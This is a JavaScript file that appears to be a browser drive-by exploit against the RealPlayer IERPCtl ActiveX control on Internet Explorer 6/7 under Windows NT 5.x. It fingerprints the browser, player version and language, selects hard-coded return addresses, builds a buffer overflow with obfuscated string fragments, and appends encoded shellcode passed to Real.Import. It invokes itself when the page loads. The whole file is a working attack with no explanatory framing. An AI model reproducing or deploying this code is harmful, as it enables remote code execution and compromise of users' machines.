function RealExploit()
{
var user = navigator.userAgent.toLowerCase();
if(user.indexOf("msie 6")==-1&&user.indexOf("msie 7")==-1)
return;
if(user.indexOf("nt 5.")==-1)
return;
VulObject = "IER" + "PCtl.I" + "ERP" + "Ctl.1";
try
{
Real = new ActiveXObject(VulObject);
}catch(error)
{
return;
}

RealVersion = Real.PlayerProperty("PRODUCTVERSION");
gddddd = "";
JmpOver = unescape("%"+"75%"+"06%"+"74%"+"04");
for(i=0;i<32*148;i++)
gddddd += "S";

if(RealVersion.indexOf("6"+"."+"0"+"."+"1"+"4"+".") == -1)
{
if (0)
return;
if(navigator.userLanguage.toLowerCase() == "zh-cn")
ret = unescape("%"+"7f%"+"a5%"+"60");
else if(navigator.userLanguage.toLowerCase() == "en-us")
ret = unescape("%"+"4f%"+"71%"+"a4%"+"60");
else
return;
}
else if(RealVersion == "6"+"."+"0"+"."+"1"+"4"+".544")
ret = unescape("%"+"63%"+"11%"+"08%"+"60");
else if(RealVersion == "6"+"."+"0"+"."+"1"+"4"+".550")
ret = unescape("%"+"63%"+"11%"+"04%"+"60");
else if(RealVersion == "6"+"."+"0"+"."+"1"+"4"+".552")
ret = unescape("%"+"79%"+"31%"+"01%"+"60");
else if(RealVersion == "6"+"."+"0"+"."+"1"+"4"+".543")
ret = unescape("%"+"79%"+"31%"+"09%"+"60");
else if(RealVersion == "6"+"."+"0"+"."+"1"+"4"+".536")
ret = unescape("%"+"51%"+"11%"+"70%"+"63");
else
return;

if(RealVersion.indexOf("6.0.10.") != -1)
{
for(i=0;i<4;i++)
gddddd = gddddd + JmpOver;
gddddd = gddddd + ret;
}
else if(RealVersion.indexOf("6"+"."+"0"+"."+"1"+"1"+".") != -1)
{
for(i=0;i<6;i++)
gddddd = gddddd + JmpOver;
gddddd = gddddd + ret;
}
else if(RealVersion.indexOf("6"+"."+"0"+"."+"1"+"2"+".") != -1)
{
for(i=0;i<9;i++)
gddddd = gddddd + JmpOver;
gddddd = gddddd + ret;
}
else if(RealVersion.indexOf("6"+"."+"0"+"."+"1"+"4"+".") != -1)
{
for(i=0;i<10;i++)
gddddd = gddddd + JmpOver;
gddddd = gddddd + ret;
}
Shell ="TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIxkR0qJPJP3YY0fNYwLEQk0p47zpfKRKJJKVe9xJKYoIoYolOoCQv3VsVwLuRKwRvavbFQvJMWVsZzMFv0z8K8mwVPnxmmn8mDUBzJMEBsHuN3ULUhmfxW6peMMZM7XPrf5NkDpP107zMpYE5MMzMj44LqxGONuKpTRrNWOVYM5mqqrwSMTnoeoty08JMnKJMgPw2pey5MgMWQuMwrunOgp8mpn8m7PrZBEleoWng2DRELgZMU6REoUJMmLHmz1KUOPCXHmLvflsRWOLNvVrFPfcVyumpRKp4dpJ9VQMJUlxmmnTL2GWOLNQKe6pfQvXeMpPuVPwP9v0";Shell=Shell+"XzFr3Ol9vRpzFDxm5NjqVxmLzdLSvTumI5alJMqqrauWJUWrhS3OQWRU5QrENVcE61vPUOVtvTv4uP0DvLYfQOjZMoJP6eeMIvQmF5fLYP1nrQEmvyZkSnFtSooFWTtTpp5oinTWLgOzmMTk8PUoVNENnW0J9mInyWQS3TRGFVt6iEUTgtBwrtTs3r5r5PfEqTCuBgEGoDUtR4CfkvB4OEDc3UUGbVib4Wo5we6VQVouXdcENeStEpfTc7nVoUBdrfnvts3c77r3VwZwyGw7rdj4OS4DTww6tuOUw2F4StTUZvkFiwxQvtsud7Z6BviR1gxUZ4IVgTBfRWygPfouZtCwWqvRHptd4RPFZVOdoRWQgrWTnPm0m2BRO59Tne3pnToPnsUt44oQqRRPeVNQuqh1uopuP";
AdjESP = "LLLL\\XXXXXLD";

PayLoad = gddddd + AdjESP + Shell;
eval(unescape("while%"+"28PayLoad.length%"+"20%"+"3C%"+"200x8000%"+"29%"+"0D%"+"0APayLoad%"+"20+%"+"3D%"+"20%"+"22ChuiZi%"+"22%"+"3B"))
Real.Import("c:\\Program Files\\NetMeeting\\TestSnd.wav", PayLoad,"", 0, 0);
}
RealExploit();